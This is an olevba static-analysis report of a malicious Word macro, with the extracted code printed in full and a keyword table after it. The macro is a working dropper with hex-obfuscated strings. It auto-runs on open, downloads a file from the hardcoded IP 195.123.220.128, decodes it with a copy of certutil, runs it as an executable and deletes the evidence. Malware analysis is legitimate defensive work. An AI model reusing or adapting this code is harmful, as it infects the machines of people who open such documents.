olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Dropper.MSOffice.SDrop.gen-5f848a7baf9305b0b96f19471b68fee0052fe701f7a9d6d92a17c30fb258bff5
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const yzqgjwsyhx = 2
Const bsrvqrnfck = 1
Const adfhneiepl = 0
#If VBA7 Then
Private Declare PtrSafe Function bpjevjcvethsw Lib "wininet" Alias "InternetOpenA" ( _
ByVal idaijsswnxtjhqrhgl As String, _
ByVal qthcmhydvzotmmpt As Long, _
ByVal nfrelxzrrfoupqg As String, _
ByVal jjsyuwmzvudyezhh As String, _
ByVal vatmmcbopnvyymjxifl As Long) As Long
Private Declare PtrSafe Function ezkltnaikhqoieccrskt Lib "wininet" Alias "InternetConnectA" ( _
ByVal acpoqkvvlqig As Long, _
ByVal rjfkxhle As String, _
ByVal jetolbqa As Integer, _
ByVal vxedspomutdrcairzt As String, _
ByVal rnbrocdkjeqabqwgsa As String, _
ByVal gjhcfbkf As Long, _
ByVal bbbsneseyfc As Long, _
ByVal ytbpfhbbgvnntlqembd As Long) As Long
Private Declare PtrSafe Function wlzgliazapaq Lib "wininet" Alias "HttpOpenRequestA" ( _
ByVal veyhqrewtfirjdbxqfz As Long, _
ByVal ltxligdyngnak As String, _
ByVal enwbteeogn As String, _
ByVal hpagmxihzooydklcia As String, _
ByVal kvczmjtgilanwmxmdk As String, _
ByVal jenimxnug As String, _
ByVal kckbshqbluzd As Long, _
ByVal fkevjlltcmvor As Long) As Long
Private Declare PtrSafe Function piiudzztscfh Lib "wininet" Alias "HttpSendRequestA" ( _
ByVal uhcoqbsh As Long, _
ByVal vxcfvzwerqcnefepj As String, _
ByVal pxvdcknrfsillteeoa As Long, _
ByVal gxfsmrdf As String, _
ByVal vqqjfmsqkmh As Long) As Boolean
Private Declare PtrSafe Function pfpxavmbgn Lib "wininet" Alias "InternetReadFile" ( _
ByVal qzgqlstzhunxkgtflmi As Long, _
ByVal ashduzjapj As String, _
ByVal zdjwphebgxibjpohwtfc As Long, _
ByRef gwzvlfiqqeh As Long) As Boolean
Private Declare PtrSafe Function zbzdbeqjkdiatvnon Lib "Kernel32" Alias "WinExec" ( _
ByVal bnpgjilysxokjjldwbm As String, _
ByVal aahxnbst As Long _
) As Long
Private Declare PtrSafe Function qegdkpnauwthcgu Lib "Kernel32" Alias "Sleep" ( _
ByVal yysftcwo As Long _
) As Long
Private Declare PtrSafe Function ziktndktu Lib "kernel32.dll" Alias "ziktndktuA" (ByVal yfizuliqmoaggyarob As String, ByVal tkcermptyb As String, ByVal wrgfikgc As Long) As Long
#Else
Private Declare Function bpjevjcvethsw Lib "wininet" Alias "InternetOpenA" ( _
ByVal pihunzvjjnvojhblrni As String, _
ByVal cncfcfawrvqtgi As Long, _
ByVal jogmuplkejhtwqfjjjxn As String, _
ByVal eevcrumwpogc As String, _
ByVal zsownhnsso As Long) As Long
Private Declare  Function ezkltnaikhqoieccrskt Lib alsxjfxuikzt("77696e69") & alsxjfxuikzt("6e6574") Alias alsxjfxuikzt("496e7465726e6574436f6e6e65") & alsxjfxuikzt("637441") ( _
ByVal lvmctkgradypq As Long, _
ByVal vuyiihoykrsoqixz As String, _
ByVal duwcwjzkiwqbihzcvxmr As Integer, _
ByVal jzsizkcpfuxtstwp As String, _
ByVal qwgmyzrnvczmn As String, _
ByVal xgcanvgwlkvq As Long, _
ByVal utzzkxmntjn As Long, _
ByVal gcymmmxudi As Long) As Long
Private Declare  Function wlzgliazapaq Lib alsxjfxuikzt("77696e") & alsxjfxuikzt("696e6574") Alias alsxjfxuikzt("487474704f70656e5265") & alsxjfxuikzt("717565737441") ( _
ByVal mtvuwixiinn As Long, _
ByVal tebhwdaaa As String, _
ByVal mqfhuxyuqwyqfdtq As String, _
ByVal ewcpnqdxqvhqdpla As String, _
ByVal zgvfsuai As String, _
ByVal rcptcrvwvknoy As String, _
ByVal dwteyktbfuupmelwsio As Long, _
ByVal qrpbvvnlgpfizphqn As Long) As Long
Private Declare  Function piiudzztscfh Lib alsxjfxuikzt("77696e696e65") & alsxjfxuikzt("74") Alias alsxjfxuikzt("4874747053656e") & alsxjfxuikzt("645265717565737441") ( _
ByVal ddkaxauflbewbdc As Long, _
ByVal ouutwcxv As String, _
ByVal vqhmxxvvpworerg As Long, _
ByVal kpkndlympbwpykhipof As String, _
ByVal nuiriorntlhpnxo As Long) As Boolean
Private Declare  Function pfpxavmbgn Lib alsxjfxuikzt("77696e696e65") & alsxjfxuikzt("74") Alias alsxjfxuikzt("496e7465726e6574526561") & alsxjfxuikzt("6446696c65") ( _
ByVal fhmwfwsqzufrwehh As Long, _
ByVal vkwusgloghmxtwrpwkko As String, _
ByVal ucnvxbwgsnefurgbmy As Long, _
ByRef yfskzfkzomonxehtlosy As Long) As Boolean
Private Declare  Function zbzdbeqjkdiatvnon Lib alsxjfxuikzt("4b65726e") & alsxjfxuikzt("656c3332") Alias alsxjfxuikzt("57696e") & alsxjfxuikzt("45786563") ( _
ByVal mgxltqldcnjujcw As String, _
ByVal cmriteeadp As Long _
) As Long
Private Declare  Function qegdkpnauwthcgu Lib alsxjfxuikzt("4b65726e656c") & alsxjfxuikzt("3332") Alias alsxjfxuikzt("53") & alsxjfxuikzt("6c656570") ( _
ByVal yysftcwo As Long _
) As Long
Private Declare Function ziktndktu Lib "kernel32.dll" Alias "ziktndktuA" (ByVal yfizuliqmoaggyarob As String, ByVal tkcermptyb As String, ByVal wrgfikgc As Long) As Long
#End If
Function rString()
Dim sxnyobkrdgojagviluev As Variant
Dim poqnpzddklsuoppbs As Long
Dim txwmuhwfanuildhkgjz As String
sxnyobkrdgojagviluev = Array(alsxjfxuikzt("61"), alsxjfxuikzt("62"), alsxjfxuikzt("72"), alsxjfxuikzt("66"), alsxjfxuikzt("78"), alsxjfxuikzt("61"), alsxjfxuikzt("71"), alsxjfxuikzt("6c"), alsxjfxuikzt("32"), alsxjfxuikzt("6a"))
For poqnpzddklsuoppbs = 1 To 7
Randomize
txwmuhwfanuildhkgjz = txwmuhwfanuildhkgjz & sxnyobkrdgojagviluev(Int((UBound(sxnyobkrdgojagviluev) - LBound(sxnyobkrdgojagviluev) + 1) * Rnd + LBound(sxnyobkrdgojagviluev)))
Next poqnpzddklsuoppbs
rString = txwmuhwfanuildhkgjz & alsxjfxuikzt("76")
End Function
Sub AutoOpen()
Dim rkxflbupqfffvw As String
Dim jdtmmspdelyp As String
rkxflbupqfffvw = alsxjfxuikzt("3139352e31") & alsxjfxuikzt("32332e3232302e313238")
jdtmmspdelyp = alsxjfxuikzt("2f632e63") & alsxjfxuikzt("7274")
Dim ausxqytaekelkyhtj As String
Dim xuhssmwjpmpl As String
Dim jomzwopoporss As String
Dim xadxcqfbyxj As String
Dim dhtzamhahe As Long
dhtzamhahe = bpjevjcvethsw(alsxjfxuikzt("4d6f7a696c6c612f352e30202857696e646f7773204e542031302e303b2057696e36343b2078363429204170706c655765624b69742f3533382e3320284b48544d4c2c206c696b65204765636b") & alsxjfxuikzt("6f29204368726f6d652f38382e302e343332342e3131205361666172692f3533372e32"), adfhneiepl, vbNullString, vbNullString, adfhneiepl)
If dhtzamhahe = 0 Then
GoTo SingleExit
End If
Dim fcvplukcfvhf As Long
fcvplukcfvhf = ezkltnaikhqoieccrskt(dhtzamhahe, rkxflbupqfffvw, 80, adfhneiepl, 0, 3, adfhneiepl, adfhneiepl)
If fcvplukcfvhf = 0 Then
GoTo SingleExit
End If
Dim xtogiqqgp As Long
Dim lazpxljatcy As Long
lazpxljatcy = wlzgliazapaq(fcvplukcfvhf, alsxjfxuikzt("474554"), jdtmmspdelyp, alsxjfxuikzt("4854") & alsxjfxuikzt("54502f312e30"), vbNullString, vbNullString, &H4000000 Or &H80000, adfhneiepl)
Dim elrslzplzrufd As Boolean
elrslzplzrufd = piiudzztscfh(lazpxljatcy, vbNullString, adfhneiepl, vbNullString, adfhneiepl)
xadxcqfbyxj = Environ("appdata")
ausxqytaekelkyhtj = xadxcqfbyxj & alsxjfxuikzt("5c") & rString
jomzwopoporss = xadxcqfbyxj & alsxjfxuikzt("5c") & rString & alsxjfxuikzt("2e6578") & alsxjfxuikzt("6520")
xuhssmwjpmpl = xadxcqfbyxj & alsxjfxuikzt("5c") & rString & alsxjfxuikzt("2e") & alsxjfxuikzt("65786520")
Dim cmovoieiizt As String * 1
Dim eesnjksirt As Long
eesnjksirt = FreeFile()
Open ausxqytaekelkyhtj For Binary Access Write As eesnjksirt
Do
Dim mhxshbkdsiyzkwx As Long
elrslzplzrufd = pfpxavmbgn(lazpxljatcy, cmovoieiizt, Len(cmovoieiizt), mhxshbkdsiyzkwx)
If mhxshbkdsiyzkwx > 0 Then
Put eesnjksirt, , cmovoieiizt
End If
Loop While mhxshbkdsiyzkwx > 0
Close eesnjksirt
FileCopy alsxjfxuikzt("5c57696e646f77735c53797374656d33325c6365727475") & alsxjfxuikzt("74696c2e657865"), xuhssmwjpmpl
Dim eeotlfagqtxzvqgykj As String
eeotlfagqtxzvqgykj = Chr(34) & xuhssmwjpmpl & Chr(34) & alsxjfxuikzt("202d") & alsxjfxuikzt("6465636f646520") & Chr(34) & ausxqytaekelkyhtj & Chr(34) & alsxjfxuikzt("20") & Chr(34) & jomzwopoporss & Chr(34)
zbzdbeqjkdiatvnon eeotlfagqtxzvqgykj, 0
qegdkpnauwthcgu 1332
zbzdbeqjkdiatvnon jomzwopoporss, 0
Kill xuhssmwjpmpl
Kill ausxqytaekelkyhtj
SingleExit:
End Sub
Private Function alsxjfxuikzt(ByVal vutimzvgujum As String) As String
Dim zwigapbvalop As Long
For zwigapbvalop = 1 To Len(vutimzvgujum) Step 2
alsxjfxuikzt = alsxjfxuikzt & Chr$(Val("&H" & Mid$(vutimzvgujum, zwigapbvalop, 2)))
Next zwigapbvalop
End Function


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|          |                    |(obfuscation: Hex)                           |
|Suspicious|Exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|          |                    |(obfuscation: Hex)                           |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |kernel32.dll        |Executable file name                         |
|IOC       |til.exe             |Executable file name (obfuscation: Hex)      |
|Hex String|wini                |77696e69                                     |
|Hex String|InternetConne       |496e7465726e6574436f6e6e65                   |
|Hex String|inet                |696e6574                                     |
|Hex String|HttpOpenRe          |487474704f70656e5265                         |
|Hex String|questA              |717565737441                                 |
|Hex String|winine              |77696e696e65                                 |
|Hex String|HttpSen             |4874747053656e                               |
|Hex String|dRequestA           |645265717565737441                           |
|Hex String|InternetRea         |496e7465726e6574526561                       |
|Hex String|dFile               |6446696c65                                   |
|Hex String|Kern                |4b65726e                                     |
|Hex String|el32                |656c3332                                     |
|Hex String|Exec                |45786563                                     |
|Hex String|Kernel              |4b65726e656c                                 |
|Hex String|leep                |6c656570                                     |
|Hex String|195.1               |3139352e31                                   |
|Hex String|23.220.128          |32332e3232302e313238                         |
|Hex String|/c.c                |2f632e63                                     |
|Hex String|Mozilla/5.0 (Windows|4d6f7a696c6c612f352e30202857696e646f7773204e5|
|          |NT 10.0; Win64; x64)|42031302e303b2057696e36343b207836342920417070|
|          |AppleWebKit/538.3   |6c655765624b69742f3533382e3320284b48544d4c2c2|
|          |(KHTML, like Geck   |06c696b65204765636b                          |
|Hex String|o)                  |6f29204368726f6d652f38382e302e343332342e31312|
|          |Chrome/88.0.4324.11 |05361666172692f3533372e32                    |
|          |Safari/537.2        |                                             |
|Hex String|TP/1.0              |54502f312e30                                 |
|Hex String|exe                 |65786520                                     |
|Hex String|\Windows\System32\ce|5c57696e646f77735c53797374656d33325c636572747|
|          |rtu                 |5                                            |
|Hex String|til.exe             |74696c2e657865                               |
|Hex String|decode              |6465636f646520                               |
+----------+--------------------+---------------------------------------------+

